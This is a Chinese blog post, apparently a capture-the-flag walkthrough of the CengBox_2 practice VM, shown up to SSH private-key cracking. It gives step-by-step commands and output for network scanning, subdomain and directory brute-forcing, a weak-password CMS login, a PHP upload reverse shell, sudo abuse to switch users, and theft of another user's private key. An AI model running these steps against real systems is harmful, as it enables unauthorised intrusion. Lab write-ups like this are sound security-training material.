@@ -1,0 +1,737 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CengBox_2 靶机信息收集1234567┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;CengBox2]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.103PORT   STATE SERVICE21&#x2F;tcp open  ftp22&#x2F;tcp open  ssh80&#x2F;tcp open  http  开放了 21, 22, 80 端口 123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CengBox_2 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/be5fd2fbc403.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="CengBox_2 靶机信息收集1234567┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;CengBox2]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.103PORT   STATE SERVICE21&#x2F;tcp open  ftp22&#x2F;tcp open  ssh80&#x2F;tcp open  http  开放了 21, 22, 80 端口 123">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7f9b2ce8c366f4fa075b992bfc4c2132_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/944b944a81cbf815bcd50f22bcb08eab_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3901d9095a3c8cd561079fe631e461b4_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/a980542c31f59f51460f7f276981c3ad_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f1a31992ffaffe860a0ee414be65ade4_MD5.png">
+<meta property="article:published_time" content="2023-10-17T05:48:57.000Z">
+<meta property="article:modified_time" content="2023-10-17T07:03:00.383Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/7f9b2ce8c366f4fa075b992bfc4c2132_MD5.png">
+  
+  
+  
+  <title>CengBox_2 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CengBox_2 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-17 13:48" pubdate>
+          2023年10月17日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          106 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CengBox_2 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CengBox-2-靶机"><a href="#CengBox-2-靶机" class="headerlink" title="CengBox_2 靶机"></a>CengBox_2 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.1.103<br><br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http<br></code></pre></td></tr></table></figure>
+
+<p>开放了 21, 22, 80 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,80 192.168.1.103<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rw-r--r--    1 0        0             209 May 23  2020 note.txt<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:192.168.1.101<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 4<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 c4:99:9d:e0:bc:07:3c:4f:53:e5:bc:27:35:80:e4:9e (RSA)<br>|   256 fe:60:a1:10:90:98:8e:b0:82:02:3b:40:bc:<span class="hljs-built_in">df</span>:66:f1 (ECDSA)<br>|_  256 3a:c3:a0:e7:bd:20:ca:1e:71:d4:3c:12:23:af:6a:c3 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Site Maintenance<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>MAC Address: 08:00:27:A4:96:C9 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+
+<p>Ubuntu 操作系统，先看看 ftp 匿名登录吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ ftp 192.168.1.103<br>Connected to 192.168.1.103.<br>220 (vsFTPd 3.0.3)<br>Name (192.168.1.103:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span> <br>229 Entering Extended Passive Mode (|||27250|)<br>150 Here comes the directory listing.<br>-rw-r--r--    1 0        0             209 May 23  2020 note.txt<br>ftp&gt; get note.txt<br></code></pre></td></tr></table></figure>
+
+<p>下载到本地后查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ <span class="hljs-built_in">cat</span> note.txt                                  <br>Hey Kevin,<br>I just <span class="hljs-built_in">set</span> up your panel and used default password. Please change them before any hack.<br><br>I try to move site to new domain <span class="hljs-built_in">which</span> name is ceng-company.vm and also I created a new area <span class="hljs-keyword">for</span> you.<br><br>Aaron<br></code></pre></td></tr></table></figure>
+
+<p>我们最直观的是拿到了两个人名，其次是对于 <code>ceng-company.vm</code> ，是一个域名，并且已经 <code>created a new area</code> 可能是指域名下的路径。尝试将域名与 IP 映射写入到 hosts 文件中。同时还有个点是默认密码，后续应该会用到。</p>
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ sudo dirsearch -u http://192.168.1.103/<br><br>[11:08:21] 200 -  555B  - /index.html<br></code></pre></td></tr></table></figure>
+
+<p>反复换了几个字典和工具，发现没有目录。不得不重新思考 <code>created a new area for you</code> 的真正含义。</p>
+<h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><p>尝试一下子域名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u ceng-company.vm -H <span class="hljs-string">&quot;Host:FUZZ.ceng-company.vm&quot;</span> --hw 76 <br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://ceng-company.vm/</span><br><span class="hljs-string">Total requests: 5000</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                                            </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000024:   403        11 L     32 W       296 Ch      &quot;admin&quot;                                            </span><br><span class="hljs-string">000002700:   400        12 L     53 W       422 Ch      &quot;m.&quot;                                               </span><br><span class="hljs-string">000002795:   400        12 L     53 W       422 Ch      &quot;ns2.cl.bellsouth.net.&quot;                            </span><br><span class="hljs-string">000002885:   400        12 L     53 W       422 Ch      &quot;ns2.viviotech.net.&quot;                               </span><br><span class="hljs-string">000002883:   400        12 L     53 W       422 Ch      &quot;ns1.viviotech.net.&quot;                               </span><br><span class="hljs-string">000003050:   400        12 L     53 W       422 Ch      &quot;ns3.cl.bellsouth.net.&quot;                            </span><br><span class="hljs-string">000004083:   400        12 L     53 W       422 Ch      &quot;quatro.oweb.com.&quot;                                 </span><br><span class="hljs-string">000004081:   400        12 L     53 W       422 Ch      &quot;ferrari.fortwayne.com.&quot;                           </span><br><span class="hljs-string">000004082:   400        12 L     53 W       422 Ch      &quot;jordan.fortwayne.com.&quot;                            </span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 4.585479</span><br><span class="hljs-string">Processed Requests: 5000</span><br><span class="hljs-string">Filtered Requests: 4991</span><br><span class="hljs-string">Requests/sec.: 1090.398</span><br></code></pre></td></tr></table></figure>
+
+<p><code>admin</code> 作为子域名的前缀，返回是 403，或许这就是我们要找的。将子域名和 IP 的映射写入 hosts 文件</p>
+<h2 id="目录爆破-1"><a href="#目录爆破-1" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>虽然网站根目录没有权限，但是不妨碍我们进行目录爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://admin.ceng-company.vm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -xphp,txt,html<br>===============================================================<br>[+] Url:                     http://admin.ceng-company.vm/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>/.html                (Status: 403) [Size: 301]<br>/.php                 (Status: 403) [Size: 300]<br>/.php                 (Status: 403) [Size: 300]<br>/.html                (Status: 403) [Size: 301]<br>/server-status        (Status: 403) [Size: 309]<br>/gila                 (Status: 301) [Size: 329] [--&gt; http://admin.ceng-company.vm/gila/]<br>Progress: 881756 / 882244 (99.94%)<br></code></pre></td></tr></table></figure>
+
+<p>我先尝试了 dirsearch 没有收获，再尝试使用 gobuster 指定字典，才发现了 <code>/gila</code> 路径</p>
+<p><img src="/pic/7f9b2ce8c366f4fa075b992bfc4c2132_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>Gila CMS</code> 尝试使用这个关键词来搜 exp</p>
+<p><img src="/pic/944b944a81cbf815bcd50f22bcb08eab_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>的确发现了一些 exp，但是本地文件包含漏洞利用失败，远程命令执行漏洞没反应，不确定是否有次漏洞。不过利用漏洞的过程中，发现了 cms 的登录界面</p>
+<p><img src="/pic/3901d9095a3c8cd561079fe631e461b4_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="用户邮箱猜测与弱口令"><a href="#用户邮箱猜测与弱口令" class="headerlink" title="用户邮箱猜测与弱口令"></a>用户邮箱猜测与弱口令</h2><p>别忘了 note.txt 中还有提示即此界面大概率使用的是默认密码，但是搜索此 cms 安装文档发现，并没有直接指定的默认密码，那就只能猜测是弱口令了。还有个问题是登录名必须是 email，猜测可能是用户名和域名之类的组合</p>
+<p>尝试了 <code>kevin@ceng-company.vm:root</code> 和 <code>kevin@ceng-company.vm:admin</code></p>
+<p>后者成功登录了系统。在这里可以上传文件也可以直接修改文件</p>
+<p><img src="/pic/a980542c31f59f51460f7f276981c3ad_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我这里尝试上传 php 文件，上传后文件被放入了 assets 文件夹</p>
+<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>提前开启监听，访问 <code>http://admin.ceng-company.vm/gila/assets/1.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox2]<br>└─$ sudo nc -lvnp 443                            <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.103] 45420<br>Linux cengbox 4.4.0-142-generic <span class="hljs-comment">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br> 20:36:52 up 12:48,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux cengbox 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:a4:96:c9 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.1.103/24 brd 192.168.1.255 scope global enp0s3</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fea4:96c9/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">$ which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@cengbox:/var/www/admin/gila$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">Matching Defaults entries for www-data on cengbox:</span><br><span class="hljs-string">    env_reset, mail_badpass,</span><br><span class="hljs-string">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="hljs-string"></span><br><span class="hljs-string">User www-data may run the following commands on cengbox:</span><br><span class="hljs-string">    (swartz) NOPASSWD: /home/swartz/runphp.sh</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="用户切换"><a href="#用户切换" class="headerlink" title="用户切换"></a>用户切换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@cengbox:/var/www/admin/gila$ sudo -u swartz /home/swartz/runphp.sh<br>sudo -u swartz /home/swartz/runphp.sh<br>Interactive mode enabled<br><br>No entry <span class="hljs-keyword">for</span> terminal <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;unknown&quot;</span>;<br>using dumb terminal settings.<br>php &gt; system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>swartz@cengbox:/var/www/admin/gila$<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">swartz@cengbox:~$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 44K<br>146972 drwxr-xr-x 4 swartz swartz     4.0K May 26  2020 .<br>390272 drwxr-xr-x 4 root   root       4.0K May 23  2020 ..<br>153153 -rw------- 1 swartz swartz        1 May 26  2020 .bash_history<br>152982 -rw-r--r-- 1 swartz swartz      220 Aug 31  2015 .bash_logout<br>152981 -rw-r--r-- 1 swartz swartz     3.7K Aug 31  2015 .bashrc<br>521119 drwx------ 2 swartz swartz     4.0K May 23  2020 .cache<br>153323 drwx------ 2 swartz developers 4.0K May 26  2020 .gnupg<br>153151 -rw------- 1 swartz developers   34 Oct 16 20:43 .php_history<br>152881 -rw-r--r-- 1 swartz swartz      655 May 16  2017 .profile<br>155694 -rw------- 1 swartz developers    1 May 26  2020 .viminfo<br>153171 -rwxr-xr-x 1 swartz swartz       20 May 26  2020 runphp.sh<br>swartz@cengbox:~$ <span class="hljs-built_in">cat</span> .bash_history<br><span class="hljs-built_in">cat</span> .bash_history<br><br>swartz@cengbox:~$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> swartz:<br></code></pre></td></tr></table></figure>
+
+<p>查看其他用户的家目录时，发现了私钥文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">swartz@cengbox:/home/mitnick/.ssh$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 20K<br>403733 drwxr-x--- 2 mitnick developers 4.0K May 25  2020 .<br>414532 drwxr-x--- 6 mitnick developers 4.0K Oct 16 22:13 ..<br>403829 -rw-r--r-- 1 mitnick developers  397 May 25  2020 authorized_keys<br>407541 -rw-r--r-- 1 mitnick developers 1.8K May 25  2020 id_rsa<br>407548 -rw-r--r-- 1 mitnick developers  397 May 25  2020 id_rsa.pub<br></code></pre></td></tr></table></figure>
+
+<h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>直接复制粘贴到本地，出现了问题：<code>Load key &quot;id_rsa&quot;: error in libcrypto</code></p>
+<p>可能是直接复制 linpeas 的结果导致的，猜测是是编码或者格式的问题，可以直接将原文件下载到本地，也可以使用 cat 命令查看 id_rsa 文件。修改其权限，尝试私钥登录，提示需要 passphrase，john 爆破</p>
